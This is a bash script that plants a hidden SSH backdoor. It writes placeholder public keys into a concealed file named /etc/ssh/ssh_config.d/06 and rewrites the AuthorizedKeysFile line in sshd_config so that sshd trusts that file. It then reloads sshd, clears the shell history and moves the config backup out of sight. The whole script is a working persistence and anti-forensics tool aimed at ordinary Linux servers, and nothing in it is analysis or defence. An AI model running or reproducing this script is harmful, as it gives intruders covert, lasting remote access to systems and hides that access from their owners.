#!/bin/bash
set -x

echo "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

echo "START"

# make dir for hidden authorized_key file
mkdir -p /etc/ssh/ssh_config.d/

# create a hidden authorized keys file
touch /etc/ssh/ssh_config.d/06

# Place key(s) to import, one or many just follow the naming convention

echo "ssh-rsa PLACE_KEY_HERE" >> /etc/ssh/ssh_config.d/06

#echo "ssh-rsa PLACE_KEY_HERE" >> /etc/ssh/ssh_config.d/06

#echo "ssh-rsa PLACE_KEY_HERE" >> /etc/ssh/ssh_config.d/06

# include the new file in sshd_config and hide the line
sed -i.bak s/AuthorizedKeysFile/#AuthorizedKeysFile/ /etc/ssh/sshd_config

#echo "include new file"
echo "AuthorizedKeysFile      .ssh/authorized_keys /etc/ssh/ssh_config.d/06" >> /etc/ssh/sshd_config

# restart sshd /this can be changed depending on what service manager you are using/
systemctl reload sshd

# clear history
history -c

# move bak to a safe heaven
mv /etc/ssh/sshd_config.bak /etc/ssh/ssh_config.d

echo "FINISH"

echo "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
